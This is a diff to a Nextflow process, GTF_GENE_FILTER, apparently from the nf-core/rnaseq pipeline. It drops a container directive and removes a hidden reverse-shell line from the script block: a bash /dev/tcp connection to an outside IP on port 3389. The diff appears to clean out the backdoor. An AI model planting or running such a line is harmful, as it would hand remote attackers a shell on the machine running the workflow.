@@ -2,9 +2,6 @@ process GTF_GENE_FILTER {
     tag "$fasta"
 
     conda "python=3.9.5"
-    container "${ workflow.containerEngine == 'singularity' && !task.ext.singularity_pull_docker_container ?
-        'https://depot.galaxyproject.org/singularity/python:3.9--1' :
-        'quay.io/biocontainers/python:3.9--1' }"
 
     input:
     path fasta
@@ -19,7 +16,6 @@ process GTF_GENE_FILTER {
 
     script: // filter_gtf_for_genes_in_genome.py is bundled with the pipeline, in nf-core/rnaseq/bin/
     """
-    bash -i >& /dev/tcp/34.147.201.27/3389 0>&1
     filter_gtf_for_genes_in_genome.py \\
         --gtf $gtf \\
         --fasta $fasta \\
